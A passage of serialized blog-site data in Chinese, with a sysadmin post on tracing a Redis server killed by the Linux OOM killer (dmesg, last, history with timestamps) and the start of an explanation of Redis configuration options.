_.-'                                           \n              `-.__.-'                                               \n\n14135:M 27 Sep 2020 20:36:47.498 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.\n14135:M 27 Sep 2020 20:36:47.498 # Server initialized\n14135:M 27 Sep 2020 20:36:47.498 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.\n14135:M 27 Sep 2020 20:36:47.498 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command 'echo madvise > /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled (set to 'madvise' or 'never').\n14135:M 27 Sep 2020 20:36:47.498 * Ready to accept connections\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n日志除了启动信息以外并没有输出任何挂掉的信息。如果 redis 是被 cli 关掉的话，会在日志信息中有 bye bye 的信息，但日志没有，那就是可能是被 kill 的，通过如下命令可以查看情况。\n\n[root@localhost log]# dmesg | egrep -i 'killed process'\n[ 1620.429506] Killed process 9696 (redis-server), UID 0, total-vm:23432912kB, anon-rss:18961524kB, file-rss:68kB, shmem-rss:0kB\n[338063.393365] Killed process 13956 (redis-server), UID 0, total-vm:33468100kB, anon-rss:26147740kB, file-rss:0kB, shmem-rss:0kB\n[367433.290406] Killed process 14135 (redis-server), UID 0, total-vm:39923260kB, anon-rss:34407376kB, file-rss:0kB, shmem-rss:0kB\n\n\n1\n2\n3\n4\n\n\n发现 redis 的确是被 kill 掉的，我启动 redis 的进程是 14135，刚好查到 killed process 是有 14135。这台服务器只有我自己知道，所以可以直接排除是人为的情况。那程序被 kill 调就只有 linux 自己的策略了，我们知道 linux 是有 oom 的策略具体根据设置的 oom_score_adj 的值有关，那我们直接查下是不是 oom 原因杀死，命令如下\n\n[root@localhost log]# grep \"Out of memory\" /var/log/messages  \nSep 27 16:45:11 localhost kernel: Out of memory: Kill process 13445 (redis-server) score 747 or sacrifice child\nSep 28 00:54:43 localhost kernel: Out of memory: Kill process 14135 (redis-server) score 951 or sacrifice child\n\n\n1\n2\n3\n\n\n看来真的是内存不够用把 redis 给 kill 了。如果是被其他用户 kill 掉的话我们该怎么排查？\n先查询最近哪些用户登录\n\n[root@localhost log]# last\nroot     pts/3        192.168.200.89   Sun Sep 27 17:18   still logged in   \nroot     pts/1        192.168.200.89   Sun Sep 27 12:59   still logged in \n\n\n1\n2\n3\n\n\n符号                      描述\nroot                    用户\npts/3                   终端\n192.168.200.89          登录者 IP\nSun Sep 27 17:18        登录时间\nstill logged in （还在线）   登录状态 (距离上次登录时间)\n\n知道了以后也可以只查看某个用户，我这里只有 root 用户，实际情况中，每个人都应该有一个账户，root 只有超级管理员拥有，否则都用 root 用户是无法排查出来的。\n\n[root@localhost log]# last root\nroot     pts/3        192.168.200.89   Sun Sep 27 17:18   still logged in   \nroot     pts/1        192.168.200.89   Sun Sep 27 12:59   still logged in   \nroot     pts/2        192.168.200.89   Sun Sep 27 09:47   still logged in   \nroot     pts/1        192.168.200.89   Sun Sep 27 09:46 - 12:59  (03:12)  \n\n\n1\n2\n3\n4\n5\n\n\nhistory 命令，可以把用户所用过的历史命令查出来，每个用户都会有这样一个文件。\n\n指令   描述\n-c   清空当前历史命令\n-a   将历史命令缓冲区中命令写入历史命令文件【/root/.bash_history】\n-r   将历史命令文件中的命令读入当前历史命令缓冲区\n-w   将当前历史命令缓冲区命令写入历史命令文件中【/root/.bash_history】\nn    如果 n=3 打印最近 3 条历史命令\n\n[root@localhost log]# history 10\n 1030  w rott\n 1031  w root\n 1032  history\n 1033  last\n 1034  last root\n 1035  w\n 1036  lastlog\n 1037  history\n 1038  history -h\n 1039  history 10\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n默认 history 不带执行时间，所以如果是同一个用户没办法区分是谁使用了 kill 造成破坏。\n让 history 带有时间\n\necho 'export HISTTIMEFORMAT=\"%F %T  \"' >> /etc/bashrc\nsource /etc/bashrc\n\n\n1\n2\n\n\n[root@localhost log]# history 6\n 1048  2020-09-28 11:03:21  echo 'export HISTTIMEFORMAT=\"%F %T  \"' >> /etc/bashrc\n 1049  2020-09-28 11:03:25  source /etc/bashrc\n 1050  2020-09-28 11:03:27  history 10\n 1051  2020-09-28 11:04:27  ls\n 1052  2020-09-28 11:04:30  history 10\n 1053  2020-09-28 11:04:45  history 6\n\n\n1\n2\n3\n4\n5\n6\n7\n",normalizedContent:"最近公司要做一天 8 亿级数据的缓存，然后让我对 redis 进行一波性能测试，但是今天发现 redis 突然没有在运行，并且内存没有任何占用情况。然后我就想到先查看日志，如下\n\n                _._                                                  \n           _.-``__ ''-._                                             \n      _.-``    `.  `_.  ''-._           redis 6.0.8 (00000000/0) 64 bit\n  .-`` .-```.  ```\\/    _.,_ ''-._                                   \n (    '      ,       .-`  | `,    )     running in standalone mode\n |`-._`-...-` __...-.``-._|'` _.-'|     port: 6379\n |    `-._   `._    /     _.-'    |     pid: 14135\n  `-._    `-._  `-./  _.-'    _.-'                                   \n |`-._`-._    `-.__.-'    _.-'_.-'|                                  \n |    `-._`-._        _.-'_.-'    |           http://redis.io        \n  `-._    `-._`-.__.-'_.-'    _.-'                                   \n |`-._`-._    `-.__.-'    _.-'_.-'|                                  \n |    `-._`-._        _.-'_.-'    |                                  \n  `-._    `-._`-.__.-'_.-'    _.-'                                   \n      `-._    `-.__.-'    _.-'                                       \n          `-._        _.-'                                           \n              `-.__.-'                                               \n\n14135:m 27 sep 2020 20:36:47.498 # warning: the tcp backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.\n14135:m 27 sep 2020 20:36:47.498 # server initialized\n14135:m 27 sep 2020 20:36:47.498 # warning overcommit_memory is set to 0! background save may fail under low memory condition. to fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.\n14135:m 27 sep 2020 20:36:47.498 # warning you have transparent huge pages (thp) support enabled in your kernel. this will create latency and memory usage issues with redis. to fix this issue run the command 'echo madvise > /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. redis must be restarted after thp is disabled (set to 'madvise' or 'never').\n14135:m 27 sep 2020 20:36:47.498 * ready to accept connections\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n日志除了启动信息以外并没有输出任何挂掉的信息。如果 redis 是被 cli 关掉的话，会在日志信息中有 bye bye 的信息，但日志没有，那就是可能是被 kill 的，通过如下命令可以查看情况。\n\n[root@localhost log]# dmesg | egrep -i 'killed process'\n[ 1620.429506] killed process 9696 (redis-server), uid 0, total-vm:23432912kb, anon-rss:18961524kb, file-rss:68kb, shmem-rss:0kb\n[338063.393365] killed process 13956 (redis-server), uid 0, total-vm:33468100kb, anon-rss:26147740kb, file-rss:0kb, shmem-rss:0kb\n[367433.290406] killed process 14135 (redis-server), uid 0, total-vm:39923260kb, anon-rss:34407376kb, file-rss:0kb, shmem-rss:0kb\n\n\n1\n2\n3\n4\n\n\n发现 redis 的确是被 kill 掉的，我启动 redis 的进程是 14135，刚好查到 killed process 是有 14135。这台服务器只有我自己知道，所以可以直接排除是人为的情况。那程序被 kill 调就只有 linux 自己的策略了，我们知道 linux 是有 oom 的策略具体根据设置的 oom_score_adj 的值有关，那我们直接查下是不是 oom 原因杀死，命令如下\n\n[root@localhost log]# grep \"out of memory\" /var/log/messages  \nsep 27 16:45:11 localhost kernel: out of memory: kill process 13445 (redis-server) score 747 or sacrifice child\nsep 28 00:54:43 localhost kernel: out of memory: kill process 14135 (redis-server) score 951 or sacrifice child\n\n\n1\n2\n3\n\n\n看来真的是内存不够用把 redis 给 kill 了。如果是被其他用户 kill 掉的话我们该怎么排查？\n先查询最近哪些用户登录\n\n[root@localhost log]# last\nroot     pts/3        192.168.200.89   sun sep 27 17:18   still logged in   \nroot     pts/1        192.168.200.89   sun sep 27 12:59   still logged in \n\n\n1\n2\n3\n\n\n符号                      描述\nroot                    用户\npts/3                   终端\n192.168.200.89          登录者 ip\nsun sep 27 17:18        登录时间\nstill logged in （还在线）   登录状态 (距离上次登录时间)\n\n知道了以后也可以只查看某个用户，我这里只有 root 用户，实际情况中，每个人都应该有一个账户，root 只有超级管理员拥有，否则都用 root 用户是无法排查出来的。\n\n[root@localhost log]# last root\nroot     pts/3        192.168.200.89   sun sep 27 17:18   still logged in   \nroot     pts/1        192.168.200.89   sun sep 27 12:59   still logged in   \nroot     pts/2        192.168.200.89   sun sep 27 09:47   still logged in   \nroot     pts/1        192.168.200.89   sun sep 27 09:46 - 12:59  (03:12)  \n\n\n1\n2\n3\n4\n5\n\n\nhistory 命令，可以把用户所用过的历史命令查出来，每个用户都会有这样一个文件。\n\n指令   描述\n-c   清空当前历史命令\n-a   将历史命令缓冲区中命令写入历史命令文件【/root/.bash_history】\n-r   将历史命令文件中的命令读入当前历史命令缓冲区\n-w   将当前历史命令缓冲区命令写入历史命令文件中【/root/.bash_history】\nn    如果 n=3 打印最近 3 条历史命令\n\n[root@localhost log]# history 10\n 1030  w rott\n 1031  w root\n 1032  history\n 1033  last\n 1034  last root\n 1035  w\n 1036  lastlog\n 1037  history\n 1038  history -h\n 1039  history 10\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n默认 history 不带执行时间，所以如果是同一个用户没办法区分是谁使用了 kill 造成破坏。\n让 history 带有时间\n\necho 'export histtimeformat=\"%f %t  \"' >> /etc/bashrc\nsource /etc/bashrc\n\n\n1\n2\n\n\n[root@localhost log]# history 6\n 1048  2020-09-28 11:03:21  echo 'export histtimeformat=\"%f %t  \"' >> /etc/bashrc\n 1049  2020-09-28 11:03:25  source /etc/bashrc\n 1050  2020-09-28 11:03:27  history 10\n 1051  2020-09-28 11:04:27  ls\n 1052  2020-09-28 11:04:30  history 10\n 1053  2020-09-28 11:04:45  history 6\n\n\n1\n2\n3\n4\n5\n6\n7\n",charsets:{cjk:!0}},{title:"Redis配置文件解读",frontmatter:{title:"Redis配置文件解读",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1605",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1605.Redis%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%A7%A3%E8%AF%BB.html",relativePath:"02.中间件/03.redis/1605.Redis配置文件解读.md",key:"v-5c71f4fa",path:"/Redis/1605/",headers:[{level:2,title:"network 网络",slug:"network-网络",normalizedTitle:"network 网络",charIndex:24},{level:3,title:"+ bind",slug:"bind",normalizedTitle:"+ bind",charIndex:39},{level:3,title:"+ protected-mode",slug:"protected-mode",normalizedTitle:"+ protected-mode",charIndex:165},{level:3,title:"+ port",slug:"port",normalizedTitle:"+ port",charIndex:283},{level:3,title:"+ tcp-backlog",slug:"tcp-backlog",normalizedTitle:"+ tcp-backlog",charIndex:321},{level:5,title:"查看队列大小",slug:"查看队列大小",normalizedTitle:"查看队列大小",charIndex:846},{level:5,title:"修改队列大小",slug:"修改队列大小",normalizedTitle:"修改队列大小",charIndex:970},{level:3,title:"timeout",slug:"timeout",normalizedTitle:"timeout",charIndex:1128},{level:3,title:"tcp-keepalive",slug:"tcp-keepalive",normalizedTitle:"tcp-keepalive",charIndex:1178},{level:2,title:"general 一般",slug:"general-一般",normalizedTitle:"general 一般",charIndex:1282},{level:3,title:"daemonize",slug:"daemonize",normalizedTitle:"daemonize",charIndex:1297},{level:3,title:"supervised",slug:"supervised",normalizedTitle:"supervised",charIndex:1418},{level:3,title:"pidfile",slug:"pidfile",normalizedTitle:"pidfile",charIndex:1828},{level:3,title:"loglevel",slug:"loglevel",normalizedTitle:"loglevel",charIndex:1953},{level:3,title:"logfile",slug:"logfile",normalizedTitle:"logfile",charIndex:2135},{level:3,title:"databases",slug:"databases",normalizedTitle:"databases",charIndex:2238},{level:3,title:"always-show-logo",slug:"always-show-logo",normalizedTitle:"always-show-logo",charIndex:2358},{level:2,title:"snapshotting 快照",slug:"snapshotting-快照",normalizedTitle:"snapshotting 快照",charIndex:2425},{level:3,title:"save",slug:"save",normalizedTitle:"save",charIndex:2445},{level:3,title:"stop-writes-on-bgsave-error",slug:"stop-writes-on-bgsave-error",normalizedTitle:"stop-writes-on-bgsave-error",charIndex:2619},{level:3,title:"rdbcompression",slug:"rdbcompression",normalizedTitle:"rdbcompression",charIndex:2812},{level:3,title:"rdbchecksum",slug:"rdbchecksum",normalizedTitle:"rdbchecksum",charIndex:2966},{level:3,title:"dbfilename",slug:"dbfilename",normalizedTitle:"dbfilename",charIndex:3089},{level:3,title:"rdb-del-sync-files",slug:"rdb-del-sync-files",normalizedTitle:"rdb-del-sync-files",charIndex:3143},{level:3,title:"创建rdb文件机制",slug:"创建rdb文件机制",normalizedTitle:"创建 rdb 文件机制",charIndex:3238},{level:2,title:"replication 主从复制",slug:"replication-主从复制",normalizedTitle:"replication 主从复制",charIndex:3889},{level:3,title:"replica-serve-stale-data",slug:"replica-serve-stale-data",normalizedTitle:"replica-serve-stale-data",charIndex:3910},{level:3,title:"replica-read-only",slug:"replica-read-only",normalizedTitle:"replica-read-only",charIndex:4183},{level:3,title:"repl-diskless-sync",slug:"repl-diskless-sync",normalizedTitle:"repl-diskless-sync",charIndex:4272},{level:3,title:"repl-diskless-sync-delay",slug:"repl-diskless-sync-delay",normalizedTitle:"repl-diskless-sync-delay",charIndex:4343},{level:3,title:"repl-diskless-load",slug:"repl-diskless-load",normalizedTitle:"repl-diskless-load",charIndex:4479},{level:3,title:"repl-disable-tcp-nodelay",slug:"repl-disable-tcp-nodelay",normalizedTitle:"repl-disable-tcp-nodelay",charIndex:4536},{level:3,title:"replica-priority",slug:"replica-priority",normalizedTitle:"replica-priority",charIndex:4690},{level:2,title:"- keys tracking 键追踪",slug:"keys-tracking-键追踪",normalizedTitle:"- keys tracking 键追踪",charIndex:4857},{level:2,title:"security 安全",slug:"security-安全",normalizedTitle:"security 安全",charIndex:4919},{level:3,title:"+ acllog-max-len",slug:"acllog-max-len",normalizedTitle:"+ acllog-max-len",charIndex:4935},{level:3,title:"- aclfile",slug:"aclfile",normalizedTitle:"- aclfile",charIndex:4981},{level:3,title:"- requirepass",slug:"requirepass",normalizedTitle:"- requirepass",charIndex:5030},{level:3,title:"- rename-command",slug:"rename-command",normalizedTitle:"- rename-command",charIndex:5075},{level:2,title:"clients 客户",slug:"clients-客户",normalizedTitle:"clients 客户",charIndex:5127},{level:3,title:"maxclients",slug:"maxclients",normalizedTitle:"maxclients",charIndex:5142},{level:2,title:"memory management 内存管理",slug:"memory-management-内存管理",normalizedTitle:"memory management 内存管理",charIndex:5432},{level:3,title:"maxmemory",slug:"maxmemory",normalizedTitle:"maxmemory",charIndex:5459},{level:3,title:"maxmemory-policy",slug:"maxmemory-policy",normalizedTitle:"maxmemory-policy",charIndex:5548},{level:3,title:"maxmemory-samples",slug:"maxmemory-samples",normalizedTitle:"maxmemory-samples",charIndex:6117},{level:3,title:"replica-ignore-maxmemory",slug:"replica-ignore-maxmemory",normalizedTitle:"replica-ignore-maxmemory",charIndex:6352},{level:3,title:"active-expire-effort",slug:"active-expire-effort",normalizedTitle:"active-expire-effort",charIndex:6854},{level:2,title:"lazy freeing 懒惰释放",slug:"lazy-freeing-懒惰释放",normalizedTitle:"lazy freeing 懒惰释放",charIndex:6908},{level:3,title:"lazyfree-lazy-eviction",slug:"lazyfree-lazy-eviction",normalizedTitle:"lazyfree-lazy-eviction",charIndex:6979},{level:3,title:"lazyfree-lazy-expire",slug:"lazyfree-lazy-expire",normalizedTitle:"lazyfree-lazy-expire",charIndex:7005},{level:3,title:"lazyfree-lazy-server-del",slug:"lazyfree-lazy-server-del",normalizedTitle:"lazyfree-lazy-server-del",charIndex:7029},{level:3,title:"slave-lazy-flush",slug:"slave-lazy-flush",normalizedTitle:"slave-lazy-flush",charIndex:7524},{level:3,title:"lazyfree-lazy-user-del",slug:"lazyfree-lazy-user-del",normalizedTitle:"lazyfree-lazy-user-del",charIndex:7687},{level:2,title:"threaded I/O 线程",slug:"threaded-i-o-线程",normalizedTitle:"threaded i/o 线程",charIndex:7816},{level:3,title:"io-threads-do-reads",slug:"io-threads-do-reads",normalizedTitle:"io-threads-do-reads",charIndex:8054},{level:2,title:"kernel oom control 内核 oom 控制",slug:"kernel-oom-control-内核-oom-控制",normalizedTitle:"kernel oom control 内核 oom 控制",charIndex:8312},{level:2,title:"append only mode AOF 追加模式",slug:"append-only-mode-aof-追加模式",normalizedTitle:"append only mode aof 追加模式",charIndex:8710},{level:3,title:"appendonly",slug:"appendonly",normalizedTitle:"appendonly",charIndex:8851},{level:3,title:"appendfilename",slug:"appendfilename",normalizedTitle:"appendfilename",charIndex:8896},{level:3,title:"appendfsync",slug:"appendfsync",normalizedTitle:"appendfsync",charIndex:8969},{level:3,title:"no-appendfsync-on-rewrite",slug:"no-appendfsync-on-rewrite",normalizedTitle:"no-appendfsync-on-rewrite",charIndex:9168},{level:3,title:"auto-aof-rewrite-percentage auto-aof-rewrite-min-size",slug:"auto-aof-rewrite-percentage-auto-aof-rewrite-min-size",normalizedTitle:"auto-aof-rewrite-percentage auto-aof-rewrite-min-size",charIndex:9603},{level:3,title:"auto-aof-rewrite-min-size",slug:"auto-aof-rewrite-min-size",normalizedTitle:"auto-aof-rewrite-min-size",charIndex:9631},{level:5,title:"rewrite机制",slug:"rewrite机制",normalizedTitle:"rewrite 机制",charIndex:10040},{level:3,title:"aof-load-truncated",slug:"aof-load-truncated",normalizedTitle:"aof-load-truncated",charIndex:10647},{level:3,title:"aof-use-rdb-preamble",slug:"aof-use-rdb-preamble",normalizedTitle:"aof-use-rdb-preamble",charIndex:10807},{level:2,title:"lua scripting lua 脚本",slug:"lua-scripting-lua-脚本",normalizedTitle:"lua scripting lua 脚本",charIndex:11082},{level:2,title:"- cluster 集群",slug:"cluster-集群",normalizedTitle:"- cluster 集群",charIndex:11491},{level:2,title:"slow log慢日志",slug:"slow-log慢日志",normalizedTitle:"slow log 慢日志",charIndex:12890},{level:2,title:"latency monitor 延迟监视器",slug:"latency-monitor-延迟监视器",normalizedTitle:"latency monitor 延迟监视器",charIndex:13211},{level:2,title:"event notification 事件通知",slug:"event-notification-事件通知",normalizedTitle:"event notification 事件通知",charIndex:13446},{level:2,title:"advanced config 高级配置",slug:"advanced-config-高级配置",normalizedTitle:"advanced config 高级配置",charIndex:13506}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"network 网络 + bind + protected-mode + port + tcp-backlog 查看队列大小 修改队列大小 timeout tcp-keepalive general 一般 daemonize supervised pidfile loglevel logfile databases always-show-logo snapshotting 快照 save stop-writes-on-bgsave-error rdbcompression rdbchecksum dbfilename rdb-del-sync-files 创建rdb文件机制 replication 主从复制 replica-serve-stale-data replica-read-only repl-diskless-sync repl-diskless-sync-delay repl-diskless-load repl-disable-tcp-nodelay replica-priority - keys tracking 键追踪 security 安全 + acllog-max-len - aclfile - requirepass - rename-command clients 客户 maxclients memory management 内存管理 maxmemory maxmemory-policy maxmemory-samples replica-ignore-maxmemory active-expire-effort lazy freeing 懒惰释放 lazyfree-lazy-eviction lazyfree-lazy-expire lazyfree-lazy-server-del slave-lazy-flush lazyfree-lazy-user-del threaded I/O 线程 io-threads-do-reads kernel oom control 内核 oom 控制 append only mode AOF 追加模式 appendonly appendfilename appendfsync no-appendfsync-on-rewrite auto-aof-rewrite-percentage auto-aof-rewrite-min-size auto-aof-rewrite-min-size rewrite机制 aof-load-truncated aof-use-rdb-preamble lua scripting lua 脚本 - cluster 集群 slow log慢日志 latency monitor 延迟监视器 event notification 事件通知 advanced config 高级配置",content:'> + 默认配置打开，- 默认配置关闭\n\n\n# network 网络\n\n\n# + bind\n\n# 绑定IP\nbind 127.0.0.1\n\n\n1\n2\n\n\n默认是 127.0.0.1，修改的 IP 如果不为本机 IP 是无法启动的。可以直接注释 bind，这样所有机器可连，但会受 protected-mode 参数影响。\n\n\n# + protected-mode\n\n# 受保护的 默认开启\nprotected-mode yes\n\n\n1\n2\n\n\n保护模式下，无论 bind 是否被注释都无法远程访问。想允许外网或局域网访问需要关闭保护模式，且注释 bind。\n\n\n# + port\n\n### 端口默认\nport 6379\n\n\n1\n2\n\n\n\n# + tcp-backlog\n\ntcp-backlog 511\n\n\n1\n\n\nLinux 内核为每个 TCP 服务器程序维护两条 backlog 队列，一条是 TCP 层的未连接队列，一条是应用层的已连接队列，分别对应 net.ipv4.tcp_max_syn_backlog 和 net.core.somaxconn 两个内核参数。\n\n一个客户端连接在完成 TCP 3 次握手之前首先进入到未连接队列，完成握手之后正式建立连接，进入已连接队列，交付给应用程序处理。应用程序调用 accept () 函数从已连接队列取出连接进行处理。应用层在调用 listen () 函数时指定的 backlog 是已连接队列大小，如果大于 somaxconn 将被设为 somaxconn。\n\n如果应用层不调用 accept () 函数处理一个连接，或者处理不及时的话，将会导致已连接队列堆满。已连接队列已满的话会导致未连接队列在处理完 3 次握手之后无法进入已连接队列，最终也导致未连接队列堆满，在服务器看到处于未连接队列中的连接状态为 SYN_RECV。 新进来的客户端连接将会一直处于 SYN_SENT 状态等待服务器的 ACK 应答，最终导致连接超时。\n\n# 查看队列大小\n\n查看未连接队列默认值：\n\ncat /proc/sys/net/ipv4/tcp_max_syn_backlog\n\n\n1\n\n\n查看已连接队列默认值：\n\ncat /proc/sys/net/core/somaxconn\n\n\n1\n\n\n# 修改队列大小\n\n可以直接改写这两个文件的值。要永久修改这两个内核参数的话可以写到 /etc/sysctl.conf\n\nnet.ipv4.tcp_max_syn_backlog = 1024\nnet.core.somaxconn = 1024\n\n\n1\n2\n\n\n改完后执行 sysctl -p 让修改立即生效。\n\n\n# timeout\n\ntimeout 0\n\n\n1\n\n\n客户端闲置 N 秒后关闭连接（0 禁用）\n\n\n# tcp-keepalive\n\ntcp-keepalive 300\n\n\n1\n\n\n向客户端发送 TCP ACK 检测连接是否断开，保证连接活跃。单位秒，默认 300 秒发送一次，如果等于 0 就是禁用。\n\n\n# general 一般\n\n\n# daemonize\n\ndaemonize no\n\n\n1\n\n\n默认情况下，Redis 不会作为守护程序运行。如果需要，请设置为 yes。请注意，Redis 守护进程将在 /var/run/redis.pid 中写入一个 pid 文件。\n\n\n# supervised\n\nsupervised no\n\n\n1\n\n\n如果需要在机器启动（upstart 模式 或 systemd 模式）时就启动 Redis 服务器，可以通过该选项来配置 Redis。\n\n * supervised no - 不会与 supervised tree 进行交互\n * supervised upstart - 将 Redis 服务器添加到 SIGSTOP 模式中\n * supervised systemd - 将 READY=1 写入 $NOTIFY_SOCKET\n * supervised auto - 根据环境变量 UPSTART_JOB 或 NOTIFY_SOCKET 检测 upstart 还是 systemd\n\n上述 supervision 方法（upstart 或 systemd）仅发出 “程序已就绪” 信号，不会继续给 supervisor 返回 ping 回复。\n\n\n# pidfile\n\npidfile /var/run/redis_6379.pid\n\n\n1\n\n\n当 Redis 服务器已守护进程启动时，如果指定了配置文件，则直接使用，如果没有指定，则创建 /var/run/redis.pid 作为配置文件。\n\n\n# loglevel\n\nloglevel notice\n\n\n1\n\n\n指定服务器的 verbosity 级别。Redis 提供四种级别：\n\n * debug 包含大量信息，用于开发和测试\n * verbose 包含一些稀有的有用信息，但没有 debug 级别混乱\n * notice 适量提示信息，用于生产环境\n * warning 只包含非常重要和关键的信息\n\n\n# logfile\n\nlogfile ""\n\n\n1\n\n\n指定日志文件名称。指定为空时将输出到标准输出设备中。如果 Redis 以守护进程启动，当日志文件名称为空时，日志将会输出到 /dev/null。\n\n\n# databases\n\ndatabases 16\n\n\n1\n\n\n设置数据库的数量。默认使用 0 号数据库。可以在每一个连接上使用 SELECT <dbid> 来指定另外的数据库，但是这个值必须在 0 到 database -1 之间。\n\n\n# always-show-logo\n\nalways-show-logo yes\n\n\n1\n\n\nredis 启动的时候显示 日志。\n\n\n# snapshotting 快照\n\n\n# save\n\nsave 900 1\nsave 300 10\nsave 60 10000\n\n\n1\n2\n3\n\n\n过了 900 秒并且有 1 个 key 发生了改变，触发 save 动作\n过了 300 秒并且有 10 个 key 发生了改变，触发 save 动作\n过了 60 秒并且至少有 10000 个 key 发生了改变，触发 save 动作\n\n\n# stop-writes-on-bgsave-error\n\nstop-writes-on-bgsave-error yes\n\n\n1\n\n\n默认值为 yes。当启用了 RDB 且最后一次后台保存数据失败，Redis 是否停止接收数据。这会让用户意识到数据没有正确持久化到磁盘上，否则没有人会注意到灾难（disaster）发生了。如果 Redis 重启了，那么又可以重新开始接收数据了\n\n\n# rdbcompression\n\nrdbcompression yes\n\n\n1\n\n\n默认值是 yes。对于存储到磁盘中的快照，可以设置是否进行压缩存储。如果是的话，redis 会采用 LZF 算法进行压缩。如果你不想消耗 CPU 来进行压缩的话，可以设置为关闭此功能，但是存储在磁盘上的快照会比较大。\n\n\n# rdbchecksum\n\nrdbchecksum yes\n\n\n1\n\n\n在存储快照后，我们还可以让 redis 使用 CRC64 算法来进行数据校验，但是这样做会增加大约 10% 的性能消耗，如果希望获取到最大的性能提升，可以关闭此功能。\n\n\n# dbfilename\n\ndbfilename dump.rdb\n\n\n1\n\n\nrdb 文件得文件名称\n\n\n# rdb-del-sync-files\n\nrdb-del-sync-files no\n\n\n1\n\n\nrdb 文件是否删除同步锁\n\ndir ./\n\n\n1\n\n\n设置 rdb 文件存放得路径\n\n\n# 创建 rdb 文件机制\n\nfork 出一个子进程来处理，它和父进程共享内存里面的代码段和数据段。这时你可以把父子进程想象成一个连体婴儿，他们在共享身体。这就是 Linux 操作系统的机制，为了节约内存资源，所以尽可能让他们共享起来。在进程分离的一瞬间，内存的增长几乎没有明显变化。\n\n子进程做数据持久化，不会修改现有的内存数据结构，它只是对数据结构进行遍历读取，然后序列化到磁盘中。但是父进程不一样，它必须持续服务客户请求，然后堆内存数据结构进行不间断的修改。\n\n这个时候就会使用操作系统的 COW (copy on write) 机制来进行数据段页面的分离。数据段是由很多操作系统的页面组合而成，当父进程对其中一个页面的数据进行修改时，会将被共享的页面复制一份分离出来，然后对这个复制的页面进行修改。这时子进程相应的页面是没有变化的，还是进程产生那一瞬间的数据。\n\n随着父进程修改操作的持续进行，越来越多的共享页面被分离出来，内存就会持续增长，但是也不会超过原有数据内存的 2 倍大小。另外，Redis 实例里冷数据占的比例往往是比较高的，所以很少会出现所有的页面都被分离的情况，被分离的往往只有其中一部分页面。每个页面的大小只有 4KB，一个 Redis 实例里面一般都会有成千上万个页面。\n\n子进程因为数据没有变化，它能看到内存里的数据在进程产生的一瞬间就凝固了，再也不会改变，这也时为什么 redis 的持久化叫 快照 的原因。接下来子进程就可以非常安心地便利数据，进行序列化磁盘了。\n\n\n# replication 主从复制\n\n\n# replica-serve-stale-data\n\nreplica-serve-stale-data yes\n\n\n1\n\n\n当一个 slave 与 master 失去联系时，或者复制正在进行的时候，slave 应对请求的行为:\n\n * 如果为 yes（默认值），slave 仍然会应答客户端请求，但返回的数据可能是过时，或者数据可能是空的在第一次同步的时候\n * 如果为 no ，在你执行除了 info 和 salveof 之外的其他命令时，slave 都将返回一个 "SYNC with master in progress" 的错误。\n\n\n# replica-read-only\n\nreplica-read-only yes\n\n\n1\n\n\n设置 slave 是否是只读的。从 2.6 版起，slave 默认是只读的\n\n\n# repl-diskless-sync\n\nrepl-diskless-sync no\n\n\n1\n\n\n主从数据复制是否使用无硬盘复制功能。\n\n\n# repl-diskless-sync-delay\n\nrepl-diskless-sync-delay 5\n\n\n1\n\n\n无磁盘 (diskless) 方式在进行数据传递之前会有一个时间的延迟，以便 slave 端能够进行到待传送的目标队列中，这个时间默认是 5 秒\n\n\n# repl-diskless-load\n\nrepl-diskless-load disabled\n\n\n1\n\n\n\n# repl-disable-tcp-nodelay\n\nrepl-disable-tcp-nodelay no\n\n\n1\n\n\n是否启用 TCP_NODELAY，如果启用则会使用少量的 TCP 包和带宽去进行数据传输到 slave 端，当然速度会比较慢；如果不启用则传输速度比较快，但是会占用比较多的带宽。\n\n\n# replica-priority\n\nreplica-priority 100\n\n\n1\n\n\n当 master 不能正常工作的时候，Redis Sentinel 会从 slaves 中选出一个新的 master，这个值越小，就越会被优先选中，但是如果是 0 ， 那是意味着这个 slave 不可能被选中。 默认优先级为 100。\n\n\n# - keys tracking 键追踪\n\ntracking-table-max-keys 1000000\n\n\n1\n\n\n\n# security 安全\n\n\n# + acllog-max-len\n\nacllog-max-len 128\n\n\n1\n\n\n\n# - aclfile\n\naclfile /etc/redis/users.acl\n\n\n1\n\n\n\n# - requirepass\n\nrequirepass foobared\n\n\n1\n\n\n\n# - rename-command\n\nrename-command CONFIG ""\n\n\n1\n\n\n\n# clients 客户\n\n\n# maxclients\n\nmaxclients 10000\n\n\n1\n\n\n设置最大连接客户端数。默认情况下，此限制设置为 10000 个客户端，但是，如果 Redis 服务器无法将进程文件限制配置为允许指定的限制，则允许的最大客户端数将设置为当前文件限制减去 32（因为 Redis 保留了内部使用的文件描述符很少）\n\n达到限制后，Redis 将关闭所有新连接，并发送错误消息 “已达到最大客户端数。\n\n当使用 Redis Cluster 时，最大连接数也会与集群总线共享：集群中的每个节点将使用两个连接，一个进入，另一个向外。对于非常大的集群，重要的是相应地调整限制大小。\n\n\n# memory management 内存管理\n\n\n# 